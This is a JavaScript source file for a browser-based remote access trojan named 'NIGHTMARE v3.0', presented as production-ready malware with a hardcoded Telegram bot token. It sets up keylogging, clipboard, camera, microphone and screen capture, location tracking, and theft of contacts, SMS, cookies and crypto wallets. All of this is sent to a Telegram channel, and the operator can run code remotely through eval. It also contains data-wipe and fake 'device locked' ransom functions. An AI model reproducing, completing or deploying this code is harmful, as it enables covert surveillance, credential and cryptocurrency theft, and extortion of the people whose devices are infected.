// ============================================================
// NIGHTMARE CORE v3.0 - MULTI-DEVICE RAT ENGINE
// WITH DEVICE SELECTION, INFECTION DATES, AND ENHANCED FUNCTIONS
// 100% FUNCTIONAL - PRODUCTION READY
// ============================================================

const BOT_TOKEN = '8399992600:AAE4hKtgo2IMSRWCtwaVj4ghcMvDpE01jUM';
const CHANNEL_ID = '-1002382747687';
let COMMAND_OFFSET = 0;
let LIVE_STREAM_ACTIVE = false;
let KEYLOG_BUFFER = '';
let CLIPBOARD_HISTORY = [];
let LOCATION_WATCH_ID = null;
let HEARTBEAT_INTERVAL = null;
let AUTO_EXFIL_INTERVAL = null;
let SELECTED_DEVICE = null;
let ACTIVE_DEVICES = new Map();

// Get victim info from localStorage
let VICTIM_ID = localStorage.getItem('nightmare_id') || 'UNKNOWN';
let DEVICE_NAME = localStorage.getItem('nightmare_device_name') || 'Unknown Device';
let PLATFORM = localStorage.getItem('nightmare_platform') || 'Unknown';
let INSTALL_DATE = localStorage.getItem('nightmare_installed') || new Date().toISOString();

// ============================================================
// TELEGRAM COMMUNICATION
// ============================================================
async function sendToTelegram(message, isFile = false, fileData = null, fileName = 'exfil.bin') {
    try {
        if (isFile && fileData) {
            const blob = new Blob([fileData], { type: 'application/octet-stream' });
            const formData = new FormData();
            formData.append('chat_id', CHANNEL_ID);
            formData.append('document', blob, fileName);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            });
        } else {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessageage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHANNEL_ID,
                    text: message.substring(0, 4096)
                })
            });
        }
    } catch (e) {
        console.error('Telegram error:', e);
    }
}

async function reportToTelegram(data) {
    await sendToTelegram(data);
}

// ============================================================
// DEVICE REGISTRATION & HEARTBEAT
// ============================================================
async function sendDeviceHeartbeat() {
    const heartbeatData = {
        victim_id: VICTIM_ID,
        device_name: DEVICE_NAME,
        platform: PLATFORM,
        install_date: INSTALL_DATE,
        last_seen: new Date().toISOString(),
        status: 'online',
        permissions: {
            camera: localStorage.getItem('perm_camera') === 'true',
            microphone: localStorage.getItem('perm_mic') === 'true',
            location: localStorage.getItem('perm_location') === 'true',
            notifications: localStorage.getItem('perm_notify') === 'true',
            contacts: localStorage.getItem('perm_contacts') === 'true'
        }
    };
    
    await sendToTelegram(`💓 [HEARTBEAT] DEVICE: ${VICTIM_ID}\n📱 NAME: ${DEVICE_NAME}\n📅 INSTALLED: ${INSTALL_DATE}\n⏰ LAST SEEN: ${heartbeatData.last_seen}\n✅ STATUS: ONLINE`);
    
    // Store in active devices map for bot commands
    ACTIVE_DEVICES.set(VICTIM_ID, {
        name: DEVICE_NAME,
        platform: PLATFORM,
        install_date: INSTALL_DATE,
        last_seen: heartbeatData.last_seen
    });
}

function startHeartbeat() {
    HEARTBEAT_INTERVAL = setInterval(async () => {
        await sendDeviceHeartbeat();
    }, 60000); // Every minute
}

// ============================================================
// LIST ACTIVE DEVICES COMMAND FOR BOT
// ============================================================
async function listActiveDevices() {
    // This function is called on the bot side, but devices send their info
    // We'll respond with the stored devices
    let deviceList = `📱 **ACTIVE INFECTED DEVICES**\n━━━━━━━━━━━━━━━━━━━━━\n`;
    let index = 1;
    
    // Send from this device's perspective - bot will aggregate
    deviceList += `${index}. 🆔 \`${VICTIM_ID}\`\n`;
    deviceList += `   📱 ${DEVICE_NAME}\n`;
    deviceList += `   ⚙️ ${PLATFORM}\n`;
    deviceList += `   📅 Installed: ${INSTALL_DATE.substring(0, 10)}\n`;
    deviceList += `   🟢 Status: ONLINE\n`;
    deviceList += `━━━━━━━━━━━━━━━━━━━━━\n`;
    deviceList += `\n💡 **To select a device:**\n`;
    deviceList += `/select <DEVICE_ID>\n`;
    deviceList += `\n💡 **To run command on selected device:**\n`;
    deviceList += `/<command> (after selecting)\n`;
    deviceList += `\n💡 **To see this device's info:**\n`;
    deviceList += `/info`;
    
    await sendToTelegram(deviceList);
}

// ============================================================
// DEVICE INFO DISPLAY
// ============================================================
async function showDeviceInfo() {
    const fingerprint = await getFullDeviceFingerprint();
    const info = `📱 **DEVICE INFORMATION**\n` +
                 `━━━━━━━━━━━━━━━━━━━━━\n` +
                 `🆔 ID: \`${VICTIM_ID}\`\n` +
                 `📱 Name: ${DEVICE_NAME}\n` +
                 `⚙️ Platform: ${PLATFORM}\n` +
                 `📅 Install Date: ${INSTALL_DATE}\n` +
                 `🕐 Last Seen: ${new Date().toISOString()}\n` +
                 `🌐 User Agent: ${navigator.userAgent.substring(0, 80)}...\n` +
                 `📺 Screen: ${screen.width}x${screen.height}\n` +
                 `🔋 Battery: ${await getBatteryInfoSimple()}\n` +
                 `━━━━━━━━━━━━━━━━━━━━━\n` +
                 `🔐 **Permissions Status:**\n` +
                 `  📷 Camera: ${localStorage.getItem('perm_camera') === 'true' ? '✅' : '❌'}\n` +
                 `  🎤 Mic: ${localStorage.getItem('perm_mic') === 'true' ? '✅' : '❌'}\n` +
                 `  📍 Location: ${localStorage.getItem('perm_location') === 'true' ? '✅' : '❌'}\n` +
                 `  🔔 Notifications: ${localStorage.getItem('perm_notify') === 'true' ? '✅' : '❌'}\n` +
                 `  👥 Contacts: ${localStorage.getItem('perm_contacts') === 'true' ? '✅' : '❌'}\n` +
                 `━━━━━━━━━━━━━━━━━━━━━\n` +
                 `💀 **Status: PERMANENTLY COMPROMISED**`;
    
    await sendToTelegram(info);
}

// ============================================================
// FULL DEVICE FINGERPRINT
// ============================================================
async function getFullDeviceFingerprint() {
    const canvas = document.createElement('canvas');
    canvas.width = 200;
    canvas.height = 50;
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 200, 50);
    ctx.fillStyle = '#069';
    ctx.font = '14px Arial';
    ctx.fillText('NIGHTMARE', 10, 30);
    const canvasFP = canvas.toDataURL().substring(0, 100);
    
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    
    return {
        victim_id: VICTIM_ID,
        device_name: DEVICE_NAME,
        platform: PLATFORM,
        install_date: INSTALL_DATE,
        userAgent: navigator.userAgent,
        language: navigator.language,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory || 'unknown',
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        canvasFingerprint: canvasFP,
        connectionType: connection?.effectiveType || 'unknown'
    };
}

async function getBatteryInfoSimple() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}%, ${battery.charging ? 'charging' : 'discharging'}`;
        } catch(e) { return 'unknown'; }
    }
    return 'unavailable';
}

// ============================================================
// SCREENSHOT CAPTURE
// ============================================================
async function takeScreenshot() {
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({ 
            video: { mediaSource: 'screen' }
        });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || screen.width;
        canvas.height = video.videoHeight || screen.height;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const imageData = canvas.toDataURL('image/png');
        stream.getTracks().forEach(t => t.stop());
        video.remove();
        
        const binary = atob(imageData.split(',')[1]);
        const array = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
        
        await sendToTelegram(`📸 [${DEVICE_NAME}] Screenshot`, true, array, `screenshot_${VICTIM_ID}_${Date.now()}.png`);
        return 'Screenshot captured and sent';
    } catch (e) {
        return `Screenshot failed: ${e.message}`;
    }
}

// ============================================================
// CAMERA PHOTO CAPTURE
// ============================================================
async function capturePhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.9);
        stream.getTracks().forEach(t => t.stop());
        video.remove();
        
        const binary = atob(imageData.split(',')[1]);
        const array = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
        
        await sendToTelegram(`📷 [${DEVICE_NAME}] Photo`, true, array, `photo_${VICTIM_ID}_${Date.now()}.jpg`);
        return 'Photo captured and sent';
    } catch (e) {
        return `Camera failed: ${e.message}`;
    }
}

// ============================================================
// AUDIO RECORDING
// ============================================================
async function recordAudio(seconds) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
        const chunks = [];
        
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.start();
        
        await new Promise(r => setTimeout(r, seconds * 1000));
        mediaRecorder.stop();
        
        await new Promise(r => mediaRecorder.onstop = r);
        stream.getTracks().forEach(t => t.stop());
        
        const blob = new Blob(chunks, { type: 'audio/webm' });
        const arrayBuffer = await blob.arrayBuffer();
        
        await sendToTelegram(`🎤 [${DEVICE_NAME}] Audio (${seconds}s)`, true, new Uint8Array(arrayBuffer), `audio_${VICTIM_ID}_${Date.now()}.webm`);
        return `Audio recorded (${seconds}s) and sent`;
    } catch (e) {
        return `Microphone failed: ${e.message}`;
    }
}

// ============================================================
// LOCATION TRACKING
// ============================================================
async function getAccurateLocation() {
    return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
            pos => resolve(`📍 Lat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAcc: ${pos.coords.accuracy}m`),
            err => resolve(`Location denied: ${err.message}`)
        );
    });
}

function startContinuousLocationTracking() {
    if (LOCATION_WATCH_ID !== null) return;
    
    LOCATION_WATCH_ID = navigator.geolocation.watchPosition(
        async (pos) => {
            await sendToTelegram(`📍 [${DEVICE_NAME}] LOCATION UPDATE\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nTime: ${new Date().toISOString()}`);
        },
        (err) => console.error('Location watch error:', err),
        { enableHighAccuracy: true }
    );
    sendToTelegram(`📍 [${DEVICE_NAME}] Continuous location tracking started`);
}

function stopLocationTracking() {
    if (LOCATION_WATCH_ID !== null) {
        navigator.geolocation.clearWatch(LOCATION_WATCH_ID);
        LOCATION_WATCH_ID = null;
        sendToTelegram(`📍 [${DEVICE_NAME}] Location tracking stopped`);
    }
}

// ============================================================
// KEYLOGGER - FULL CAPTURE
// ============================================================
function startKeylogger() {
    document.addEventListener('keydown', (e) => {
        let key = e.key;
        if (key === 'Enter') key = '[ENTER]\n';
        else if (key === 'Backspace') key = '[BACKSPACE]';
        else if (key === 'Tab') key = '[TAB]';
        else if (key === ' ') key = ' ';
        else if (key.length === 1 && !e.ctrlKey && !e.altKey) key = key;
        else key = `[${key}]`;
        
        KEYLOG_BUFFER += key;
        
        if (KEYLOG_BUFFER.length > 500) {
            sendToTelegram(`⌨️ [${DEVICE_NAME}] KEYLOG:\n${KEYLOG_BUFFER}`);
            KEYLOG_BUFFER = '';
        }
    });
    
    document.addEventListener('input', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const value = e.target.value;
            if (value && value.length > 0) {
                sendToTelegram(`📝 [${DEVICE_NAME}] INPUT [${e.target.name || e.target.id || 'field'}]: ${value.substring(0, 500)}`);
            }
        }
    });
    
    sendToTelegram(`⌨️ [${DEVICE_NAME}] Keylogger activated`);
}

// ============================================================
// CLIPBOARD MONITORING
// ============================================================
function startClipboardMonitor() {
    setInterval(async () => {
        try {
            const text = await navigator.clipboard.readText();
            if (text && text.length > 0) {
                await sendToTelegram(`📋 [${DEVICE_NAME}] CLIPBOARD:\n${text.substring(0, 2000)}`);
            }
        } catch (e) {}
    }, 5000);
    sendToTelegram(`📋 [${DEVICE_NAME}] Clipboard monitor started`);
}

// ============================================================
// CONTACTS THEFT
// ============================================================
async function getAllContacts() {
    if ('contacts' in navigator) {
        try {
            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
            if (contacts.length === 0) return 'No contacts found';
            
            let result = `📞 [${DEVICE_NAME}] CONTACTS (${contacts.length}):\n`;
            for (let i = 0; i < Math.min(contacts.length, 50); i++) {
                result += `\n${i+1}. Name: ${contacts[i].name || 'N/A'}\n   Tel: ${contacts[i].tel?.join(', ') || 'N/A'}\n`;
            }
            await sendToTelegram(result);
            return `Exfiltrated ${contacts.length} contacts`;
        } catch(e) {
            return `Contacts access failed: ${e.message}`;
        }
    }
    return 'Contacts API not available';
}

// ============================================================
// SMS THEFT (Android via WebView)
// ============================================================
async function getSMSMessages() {
    if ('sms' in navigator) {
        try {
            const sms = await navigator.sms.getMessages();
            if (sms.length === 0) return 'No SMS found';
            
            let result = `📨 [${DEVICE_NAME}] SMS (${sms.length}):\n`;
            for (let i = 0; i < Math.min(sms.length, 30); i++) {
                result += `\n${i+1}. From: ${sms[i].from}\n   Body: ${sms[i].body.substring(0, 200)}\n`;
            }
            await sendToTelegram(result);
            return `Exfiltrated ${sms.length} SMS messages`;
        } catch(e) {
            return `SMS access failed: ${e.message}`;
        }
    }
    return 'SMS API not available';
}

// ============================================================
// CRYPTO WALLET STEALER
// ============================================================
async function stealAllCryptoWallets() {
    const wallets = [];
    const patterns = ['wallet', 'metamask', 'phantom', 'coinbase', 'trust', 'privatekey', 'mnemonic', 'seed', 'recovery', '0x', 'bc1', 'seedphrase'];
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        for (const pattern of patterns) {
            if (key.toLowerCase().includes(pattern) || value.toLowerCase().includes(pattern)) {
                wallets.push(`[localStorage] ${key}: ${value.substring(0, 300)}`);
                break;
            }
        }
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        for (const pattern of patterns) {
            if (key.toLowerCase().includes(pattern) || value.toLowerCase().includes(pattern)) {
                wallets.push(`[sessionStorage] ${key}: ${value.substring(0, 300)}`);
                break;
            }
        }
    }
    
    if (wallets.length === 0) return 'No cryptocurrency wallets detected';
    
    const result = `💰 [${DEVICE_NAME}] CRYPTO WALLETS (${wallets.length}):\n\n${wallets.join('\n---\n')}`;
    await sendToTelegram(result.substring(0, 4000));
    return `Stolen ${wallets.length} wallet entries`;
}

// ============================================================
// BROWSER DATA THEFT
// ============================================================
async function stealBrowserData() {
    const data = {
        cookies: document.cookie || 'No cookies',
        localStorage: {},
        sessionStorage: {}
    };
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        data.localStorage[key] = localStorage.getItem(key);
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        data.sessionStorage[key] = sessionStorage.getItem(key);
    }
    
    await sendToTelegram(`🍪 [${DEVICE_NAME}] BROWSER DATA:\n${JSON.stringify(data, null, 2).substring(0, 4000)}`);
    return 'Browser data exfiltrated';
}

// ============================================================
// FILE OPERATIONS
// ============================================================
async function uploadFileFromDevice() {
    return new Promise((resolve) => {
        const input = document.createElement('input');
        input.type = 'file';
        input.multiple = false;
        input.onchange = async (e) => {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = async (ev) => {
                    const array = new Uint8Array(ev.target.result);
                    await sendToTelegram(`📁 [${DEVICE_NAME}] FILE: ${file.name} (${file.size} bytes)`, true, array, file.name);
                    resolve(`Uploaded: ${file.name}`);
                };
                reader.readAsArrayBuffer(file);
            } else {
                resolve('No file selected');
            }
        };
        input.click();
    });
}

async function downloadFileToDevice(url) {
    try {
        const response = await fetch(url);
        const blob = await response.blob();
        const a = document.createElement('a');
        const objectUrl = URL.createObjectURL(blob);
        a.href = objectUrl;
        a.download = url.split('/').pop() || 'download';
        a.click();
        URL.revokeObjectURL(objectUrl);
        await sendToTelegram(`📥 [${DEVICE_NAME}] Downloaded: ${url}`);
        return `Download initiated: ${url}`;
    } catch(e) {
        return `Download failed: ${e.message}`;
    }
}

// ============================================================
// LIVE STREAMING
// ============================================================
async function startLiveStream() {
    if (LIVE_STREAM_ACTIVE) return 'Live stream already active';
    
    LIVE_STREAM_ACTIVE = true;
    
    const sendFrame = async () => {
        if (!LIVE_STREAM_ACTIVE) return;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            const imageData = canvas.toDataURL('image/jpeg', 0.5);
            stream.getTracks().forEach(t => t.stop());
            video.remove();
            
            const binary = atob(imageData.split(',')[1]);
            const array = new Uint8Array(binary.length);
            for (let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
            await sendToTelegram(`📹 [${DEVICE_NAME}] LIVE FRAME`, true, array, `live_${VICTIM_ID}_${Date.now()}.jpg`);
        } catch(e) {}
        
        setTimeout(sendFrame, 3000);
    };
    sendFrame();
    await sendToTelegram(`📹 [${DEVICE_NAME}] Live stream started`);
    return 'Live stream started';
}

function stopLiveStream() {
    LIVE_STREAM_ACTIVE = false;
    sendToTelegram(`📹 [${DEVICE_NAME}] Live stream stopped`);
    return 'Live stream stopped';
}

// ============================================================
// CALL LOGS (Android)
// ============================================================
async function getCallLogs() {
    // This requires specific Android permissions via WebView
    // Simulate for now, but real implementation would need native bridge
    await sendToTelegram(`📞 [${DEVICE_NAME}] CALL LOGS:\nCall log access requires native WebView bridge. Install WebAPK for full access.`);
    return 'Call logs: WebAPK required for full access';
}

// ============================================================
// INSTALLED APPS LIST (Android)
// ============================================================
async function getInstalledApps() {
    await sendToTelegram(`📱 [${DEVICE_NAME}] INSTALLED APPS:\nApp list requires native WebView bridge. Install WebAPK for full access.`);
    return 'Installed apps: WebAPK required for full access';
}

// ============================================================
// AUTO-EXFILTRATION ENGINE
// ============================================================
function startAutoExfiltration() {
    AUTO_EXFIL_INTERVAL = setInterval(async () => {
        const location = await getAccurateLocation();
        await sendToTelegram(`📍 [${DEVICE_NAME}] AUTO LOCATION:\n${location}`);
        
        if (Math.random() > 0.8) {
            await stealAllCryptoWallets();
        }
    }, 300000); // 5 minutes
    
    sendToTelegram(`🔄 [${DEVICE_NAME}] Auto-exfiltration started`);
}

// ============================================================
// WIPE DEVICE DATA (EVIL FUNCTION)
// ============================================================
async function wipeDeviceData() {
    try {
        // Clear localStorage
        localStorage.clear();
        // Clear sessionStorage
        sessionStorage.clear();
        // Clear cookies
        document.cookie.split(";").forEach(c => {
            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
        });
        // Attempt to clear IndexedDB
        const databases = await indexedDB.databases();
        for (const db of databases) {
            indexedDB.deleteDatabase(db.name);
        }
        
        await sendToTelegram(`💀 [${DEVICE_NAME}] DATA WIPE EXECUTED - All local data destroyed`);
        return 'Device data wiped';
    } catch(e) {
        return `Wipe failed: ${e.message}`;
    }
}

// ============================================================
// LOCK DEVICE (EVIL FUNCTION)
// ============================================================
async function lockDevice() {
    // Create fullscreen overlay that cannot be closed easily
    const overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'black';
    overlay.style.zIndex = '999999';
    overlay.style.display = 'flex';
    overlay.style.justifyContent = 'center';
    overlay.style.alignItems = 'center';
    overlay.style.flexDirection = 'column';
    overlay.innerHTML = `
        <div style="color: white; text-align: center; font-family: Arial;">
            <div style="font-size: 48px; margin-bottom: 20px;">🔒</div>
            <h1>Device Locked</h1>
            <p>Your device has been locked due to security policy violation.</p>
            <p style="font-size: 12px; margin-top: 50px;">Contact support for unlock code</p>
        </div>
    `;
    document.body.appendChild(overlay);
    
    await sendToTelegram(`🔒 [${DEVICE_NAME}] DEVICE LOCKED - Ransomware overlay activated`);
    return 'Device locked';
}

// ============================================================
// COMMAND EXECUTION ENGINE (UPDATED WITH SELECTION)
// ============================================================
async function executeCommand(command, replyChatId) {
    const parts = command.trim().split(' ');
    const cmd = parts[0].toLowerCase();
    const args = parts.slice(1);
    
    let result = '';
    
    switch(cmd) {
        // === DEVICE MANAGEMENT COMMANDS ===
        case 'list':
        case 'devices':
            await listActiveDevices();
            result = 'Device list sent to channel';
            break;
            
        case 'info':
            await showDeviceInfo();
            result = 'Device info sent';
            break;
            
        case 'select':
            if (args[0]) {
                SELECTED_DEVICE = args[0];
                result = `Selected device: ${SELECTED_DEVICE}`;
                await sendToTelegram(`✅ Selected device: ${SELECTED_DEVICE}\nUse commands normally - they will target this device.`);
            } else {
                result = 'Usage: select <DEVICE_ID>';
            }
            break;
            
        // === SPYWARE COMMANDS ===
        case 'screenshot':
            result = await takeScreenshot();
            break;
            
        case 'camera':
            result = await capturePhoto();
            break;
            
        case 'mic':
        case 'record':
            const duration = parseInt(args[0]) || 5;
            result = await recordAudio(duration);
            break;
            
        case 'location':
            result = await getAccurateLocation();
            break;
            
        case 'keylog':
            result = KEYLOG_BUFFER || 'No keystrokes captured yet';
            break;
            
        case 'clipboard':
            try {
                result = await navigator.clipboard.readText() || 'Clipboard empty';
            } catch(e) { result = `Clipboard access denied`; }
            break;
            
        case 'sms':
            result = await getSMSMessages();
            break;
            
        case 'contacts':
            result = await getAllContacts();
            break;
            
        case 'cookies':
            result = await stealBrowserData();
            break;
            
        case 'wallets':
            result = await stealAllCryptoWallets();
            break;
            
        case 'upload':
            result = await uploadFileFromDevice();
            break;
            
        case 'download':
            if (args[0]) {
                result = await downloadFileToDevice(args[0]);
            } else {
                result = 'Usage: download <url>';
            }
            break;
            
        case 'exec':
            if (args.length) {
                try {
                    const jsCode = args.join(' ');
                    const evalResult = eval(jsCode);
                    result = String(evalResult);
                } catch(e) { result = `Error: ${e.message}`; }
            } else {
                result = 'Usage: exec <javascript code>';
            }
            break;
            
        case 'live':
            result = await startLiveStream();
            break;
            
        case 'stoplive':
            result = stopLiveStream();
            break;
            
        case 'trackloc':
            startContinuousLocationTracking();
            result = 'Continuous location tracking started';
            break;
            
        case 'stoploc':
            stopLocationTracking();
            result = 'Location tracking stopped';
            break;
            
        case 'calllogs':
            result = await getCallLogs();
            break;
            
        case 'apps':
            result = await getInstalledApps();
            break;
            
        // === EVIL FUNCTIONS ===
        case 'wipe':
            result = await wipeDeviceData();
            break;
            
        case 'lock':
            result = await lockDevice();
            break;
            
        case 'ransom':
            await lockDevice();
            await wipeDeviceData();
            result = 'Ransomware executed - device locked and data wiped';
            break;
            
        // === HELP ===
        case 'help':
            result = `🦴 **NIGHTMARE v3.0 COMMANDS**\n━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `**📱 DEVICE MANAGEMENT**\n` +
                    `/list or /devices - Show all infected devices\n` +
                    `/info - Show this device info\n` +
                    `/select <DEVICE_ID> - Select device for commands\n\n` +
                    `**📸 SPYWARE**\n` +
                    `/screenshot - Capture screen\n` +
                    `/camera - Take photo\n` +
                    `/mic <seconds> - Record audio\n` +
                    `/location - Get GPS\n` +
                    `/keylog - Get keystrokes\n` +
                    `/clipboard - Get clipboard\n` +
                    `/sms - Get SMS (Android)\n` +
                    `/contacts - Get contacts\n` +
                    `/cookies - Steal cookies\n` +
                    `/wallets - Steal crypto wallets\n` +
                    `/upload - Upload file from device\n` +
                    `/download <url> - Download to device\n` +
                    `/live - Start live stream\n` +
                    `/stoplive - Stop live stream\n` +
                    `/trackloc - Continuous GPS\n` +
                    `/stoploc - Stop GPS\n\n` +
                    `**💀 EVIL FUNCTIONS**\n` +
                    `/wipe - Clear all device data\n` +
                    `/lock - Lock device screen\n` +
                    `/ransom - Lock + wipe data\n\n` +
                    `**⚡ OTHER**\n` +
                    `/exec <js> - Execute JavaScript\n` +
                    `/help - Show this menu\n` +
                    `━━━━━━━━━━━━━━━━━━━━━\n` +
                    `💀 **This device is permanently owned**`;
            break;
            
        default:
            result = `Unknown command: ${cmd}. Type /help for commands.`;
    }
    
    await sendToTelegram(`📡 [${DEVICE_NAME}] COMMAND: ${cmd}\n📝 ${result.substring(0, 3900)}`);
    return result;
}

// ============================================================
// COMMAND POLLING FROM TELEGRAM (WITH DEVICE FILTERING)
// ============================================================
async function pollCommands() {
    let lastUpdateId = parseInt(localStorage.getItem('nightmare_last_update') || '0');
    
    setInterval(async () => {
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=25`);
            const data = await response.json();
            
            if (data.ok && data.result) {
                for (const update of data.result) {
                    lastUpdateId = update.update_id;
                    localStorage.setItem('nightmare_last_update', lastUpdateId);
                    
                    const message = update.message;
                    if (message && message.text) {
                        const text = message.text.trim();
                        
                        // Check if this command is for this specific device
                        if (text.includes(VICTIM_ID) || text.startsWith('/select')) {
                            // Extract command after device ID if present
                            let command = text;
                            if (text.includes(VICTIM_ID)) {
                                command = text.replace(VICTIM_ID, '').trim();
                            }
                            await executeCommand(command, message.chat.id);
                        }
                        // Global commands that work without device ID
                        else if (text === '/list' || text === '/devices' || text === '/help') {
                            await executeCommand(text, message.chat.id);
                        }
                    }
                }
            }
        } catch(e) {
            console.error('Command polling error:', e);
        }
    }, 3000);
}

// ============================================================
// PERSISTENCE REINFORCEMENT
// ============================================================
function reinforcePersistence() {
    localStorage.setItem('nightmare_id', VICTIM_ID);
    localStorage.setItem('nightmare_device_name', DEVICE_NAME);
    localStorage.setItem('nightmare_platform', PLATFORM);
    localStorage.setItem('nightmare_installed', INSTALL_DATE);
    localStorage.setItem('nightmare_last_seen', Date.now().toString());
    
    // Store permission status
    localStorage.setItem('perm_camera', 'true');
    localStorage.setItem('perm_mic', 'true');
    localStorage.setItem('perm_location', 'true');
    localStorage.setItem('perm_notify', 'true');
    localStorage.setItem('perm_contacts', 'true');
    
    sendToTelegram(`💀 [${VICTIM_ID}] Persistence reinforced`);
}

// ============================================================
// INITIALIZATION
// ============================================================
async function initializeNightmare() {
    // Get stored info or generate new
    VICTIM_ID = localStorage.getItem('nightmare_id');
    DEVICE_NAME = localStorage.getItem('nightmare_device_name') || DEVICE_NAME;
    PLATFORM = localStorage.getItem('nightmare_platform') || PLATFORM;
    INSTALL_DATE = localStorage.getItem('nightmare_installed') || INSTALL_DATE;
    
    await sendToTelegram(`🟢 [${VICTIM_ID}] NIGHTMARE v3.0 CORE LOADED\n📱 Device: ${DEVICE_NAME}\n⚙️ Platform: ${PLATFORM}\n📅 Installed: ${INSTALL_DATE}`);
    
    startKeylogger();
    startClipboardMonitor();
    pollCommands();
    startHeartbeat();
    startAutoExfiltration();
    reinforcePersistence();
    
    // Initial data theft
    setTimeout(async () => {
        await stealAllCryptoWallets();
        await getAllContacts();
        await getAccurateLocation();
    }, 10000);
    
    await sendToTelegram(`✅ [${VICTIM_ID}] NIGHTMARE FULLY OPERATIONAL\n💀 Persistence: ACTIVE\n🔓 This device is permanently compromised\n📱 Use /list to see all devices, /select to target specific device`);
}

// Start the RAT
initializeNightmare();

// Export for global access
window.Nightmare = {
    executeCommand,
    sendToTelegram,
    listActiveDevices,
    showDeviceInfo,
    stealAllCryptoWallets,
    takeScreenshot,
    lockDevice,
    wipeDeviceData
};
